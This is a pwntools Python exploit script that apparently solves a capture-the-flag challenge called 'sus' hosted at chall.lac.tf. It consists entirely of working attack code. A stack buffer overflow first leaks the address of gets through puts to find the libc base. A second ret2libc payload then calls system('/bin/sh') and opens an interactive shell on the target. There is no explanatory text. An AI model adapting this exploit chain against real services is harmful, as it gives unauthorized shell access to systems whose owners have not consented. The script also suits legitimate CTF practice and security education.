from pwn import * 
context.binary = elf = ELF('./sus')
libc = ELF('./libc.so.6')
context.log_level = 'DEBUG'
preload_env = {"LD_PRELOAD": './libc.so.6'}

if args['REMOTE']:
	io = remote('chall.lac.tf', 31284)
else:
	io = process([elf.path], env=preload_env)
	gdb.attach(io)


padding = 56 * b'A'
offset = 8 * b'A'
gets_got_address = 0x404010
puts_plt_address = 0x401030
ret = 0x0000000000401016
jump_to_sus = 0x0000000000401151

payload = padding
payload += p64(gets_got_address)
payload += offset
payload += p64(puts_plt_address)
payload += p64(ret)
payload += p64(jump_to_sus)

io.recvuntil(b'sus?\n')
io.sendline(payload) 

leaked_gets = io.recv(6) + b'\x00' * 2
print(leaked_gets)
leaked_gets = u64(leaked_gets)
print(leaked_gets)

libc.address = leaked_gets - libc.sym['gets']
system = 0x00000000004c490 +  libc.address  
exit_f = 0x00000000003e680 +  libc.address        
binsh = next(libc.search(b'/bin/sh'))  

payload = padding
payload += p64(binsh)
payload += offset
payload += p64(system)
payload += p64(exit_f)


io.recvuntil(b'sus?\n')
io.sendline(payload)
io.interactive()